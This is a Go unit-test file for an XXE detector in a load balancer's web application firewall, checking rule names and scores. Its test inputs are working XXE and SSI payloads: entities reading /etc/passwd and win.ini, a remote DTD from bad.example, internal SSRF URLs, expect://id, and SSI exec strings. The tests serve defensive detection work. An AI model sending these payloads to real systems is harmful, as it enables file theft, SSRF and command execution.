package xxe

import (
	"testing"

	"github.com/openloadbalancer/olb/internal/waf/detection"
)

func xmlCtx(body string) *detection.RequestContext {
	return &detection.RequestContext{
		ContentType: "application/xml",
		Body:        []byte(body),
		BodyParams:  make(map[string]string),
		Headers:     make(map[string][]string),
		Cookies:     make(map[string]string),
	}
}

func TestXXEDetector_BasicXXE(t *testing.T) {
	d := New()
	attacks := []struct {
		name string
		body string
	}{
		{"entity declaration", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`},
		{"parameter entity", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://bad.example/xxe.dtd">%xxe;]>`},
		{"system http", `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/secret">]>`},
	}

	for _, tt := range attacks {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &detection.RequestContext{
				ContentType: "application/xml",
				Body:        []byte(tt.body),
				BodyParams:  make(map[string]string),
				Headers:     make(map[string][]string),
				Cookies:     make(map[string]string),
			}
			findings := d.Detect(ctx)
			if len(findings) == 0 {
				t.Errorf("expected XXE detection for %q", tt.name)
			}
		})
	}
}

func TestXXEDetector_SkipsNonXML(t *testing.T) {
	d := New()
	ctx := &detection.RequestContext{
		ContentType: "application/json",
		Body:        []byte(`<!ENTITY xxe SYSTEM "file:///etc/passwd">`),
		BodyParams:  make(map[string]string),
		Headers:     make(map[string][]string),
		Cookies:     make(map[string]string),
	}
	findings := d.Detect(ctx)
	if len(findings) != 0 {
		t.Error("expected no XXE detection for non-XML content type")
	}
}

func TestDetector_Name(t *testing.T) {
	d := New()
	if d.Name() != "xxe" {
		t.Errorf("expected name 'xxe', got %q", d.Name())
	}
}

func TestXXE_EmptyBody(t *testing.T) {
	d := New()
	ctx := &detection.RequestContext{
		ContentType: "application/xml",
		Body:        nil,
		BodyParams:  make(map[string]string),
		Headers:     make(map[string][]string),
		Cookies:     make(map[string]string),
	}
	findings := d.Detect(ctx)
	if len(findings) != 0 {
		t.Error("expected no findings for empty body")
	}
}

func TestXXE_DoctypeOnly(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!DOCTYPE html><html></html>`)
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected findings for DOCTYPE")
	}
	found := false
	for _, f := range findings {
		if f.Rule == "doctype" {
			found = true
			if f.Score != 30 {
				t.Errorf("expected score 30 for doctype, got %d", f.Score)
			}
		}
	}
	if !found {
		t.Error("expected doctype rule")
	}
}

func TestXXE_EntityDeclaration(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY test "value">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "entity_declaration" {
			found = true
			if f.Score != 70 {
				t.Errorf("expected score 70, got %d", f.Score)
			}
		}
	}
	if !found {
		t.Error("expected entity_declaration rule")
	}
}

func TestXXE_ParameterEntityPercent(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY % test "value">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "parameter_entity" {
			found = true
			if f.Score != 85 {
				t.Errorf("expected score 85, got %d", f.Score)
			}
		}
	}
	if !found {
		t.Error("expected parameter_entity rule")
	}
}

func TestXXE_ParameterEntityNoSpace(t *testing.T) {
	d := New()
	// <!ENTITY% (no space before %)
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY% test "value">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "parameter_entity" {
			found = true
		}
	}
	if !found {
		t.Error("expected parameter_entity rule for <!ENTITY% (no space)")
	}
}

func TestXXE_SystemFile(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "system_file" {
			found = true
			if f.Score != 95 {
				t.Errorf("expected score 95, got %d", f.Score)
			}
		}
	}
	if !found {
		t.Error("expected system_file rule")
	}
}

func TestXXE_SystemFileColon(t *testing.T) {
	d := New()
	// SYSTEM with file: (no double slash)
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:c:/windows/win.ini">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "system_file" {
			found = true
		}
	}
	if !found {
		t.Error("expected system_file rule for SYSTEM file:")
	}
}

func TestXXE_SystemHTTP(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/data">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "system_http" || f.Rule == "system_file" {
			found = true
		}
	}
	if !found {
		t.Error("expected system_http rule")
	}
}

func TestXXE_SystemHTTPS(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://internal.server/data">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "system_http" {
			found = true
		}
	}
	if !found {
		t.Error("expected system_http rule for HTTPS")
	}
}

func TestXXE_SystemExpect(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "system_expect" {
			found = true
			if f.Score != 95 {
				t.Errorf("expected score 95, got %d", f.Score)
			}
		}
	}
	if !found {
		t.Error("expected system_expect rule")
	}
}

func TestXXE_SSIInclude(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!--#include virtual="/etc/passwd" -->`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "ssi_injection" {
			found = true
			if f.Score != 70 {
				t.Errorf("expected score 70, got %d", f.Score)
			}
		}
	}
	if !found {
		t.Error("expected ssi_injection rule for include")
	}
}

func TestXXE_SSIExec(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!--#exec cmd="id" -->`)
	findings := d.Detect(ctx)
	found := false
	for _, f := range findings {
		if f.Rule == "ssi_injection" {
			found = true
		}
	}
	if !found {
		t.Error("expected ssi_injection rule for exec")
	}
}

func TestXXE_TextXML(t *testing.T) {
	d := New()
	// text/xml content type should also be checked
	ctx := &detection.RequestContext{
		ContentType: "text/xml",
		Body:        []byte(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`),
		BodyParams:  make(map[string]string),
		Headers:     make(map[string][]string),
		Cookies:     make(map[string]string),
	}
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected detection for text/xml content type")
	}
}

func TestXXE_NoDetection(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<?xml version="1.0"?><root><item>safe data</item></root>`)
	findings := d.Detect(ctx)
	if len(findings) != 0 {
		t.Error("expected no findings for safe XML")
	}
}

func TestXXE_SystemWithoutProtocol(t *testing.T) {
	d := New()
	// SYSTEM keyword without any protocol should not trigger system_* rules
	ctx := xmlCtx(`<data>system check passed</data>`)
	findings := d.Detect(ctx)
	if len(findings) != 0 {
		t.Error("expected no findings for 'system' in text without protocols")
	}
}

func TestXXE_EmptyBodyBytes(t *testing.T) {
	d := New()
	ctx := &detection.RequestContext{
		ContentType: "application/xml",
		Body:        []byte{},
		BodyParams:  make(map[string]string),
		Headers:     make(map[string][]string),
		Cookies:     make(map[string]string),
	}
	findings := d.Detect(ctx)
	if len(findings) != 0 {
		t.Error("expected no findings for empty body bytes")
	}
}

func TestXXE_CaseInsensitive(t *testing.T) {
	d := New()
	ctx := xmlCtx(`<!doctype foo [<!entity xxe SYSTEM "FILE:///etc/passwd">]>`)
	findings := d.Detect(ctx)
	if len(findings) == 0 {
		t.Error("expected case-insensitive detection")
	}
}
